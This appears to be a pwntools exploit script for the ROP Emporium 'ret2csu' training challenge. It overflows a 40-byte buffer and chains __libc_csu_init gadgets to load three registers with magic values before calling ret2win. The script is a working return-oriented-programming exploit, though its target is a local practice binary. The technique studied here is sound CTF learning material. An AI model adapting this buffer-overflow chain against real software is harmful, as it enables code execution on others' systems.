#!/usr/bin/env python3

from pwn import *

pwn = './ret2csu'
elf = ELF(pwn)
lib = ELF('./libret2csu.so')
gdbscript = '''
b main
c
b pwnme
c
b * 0x00007ffff7c009d2
c
'''
context.terminal = 'kitty'

buffer = 40
POP_RDI = 0x4006a3
POP_RSI_R15 = 0x4006a1
POP_RBX_RBP_R12_15 = 0x40069a
MOV_RDX_R15_RSI_R14_EDI_R13d = 0x400680
_INIT_ADDR = 0x600398

rdi = 0xdeadbeefdeadbeef
rsi = 0xcafebabecafebabe
rdx = 0xd00df00dd00df00d

def conn():
	if args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	else:
		return process(pwn)

io = conn()

f = open('input','wb')

payload  = b'' #					  rbx      rbp          r12
payload += p64(POP_RBX_RBP_R12_15) + p64(0) + p64(1) + p64(_INIT_ADDR) + p64(0) + p64(rsi) + p64(rdx)
payload += p64(MOV_RDX_R15_RSI_R14_EDI_R13d) + p64(0)*7 + p64(POP_RDI) + p64(rdi) + p64(elf.plt.ret2win)


f.write(payload)
io.recvuntil(b'> ')
io.sendline(b'A'*buffer + payload)
io.interactive()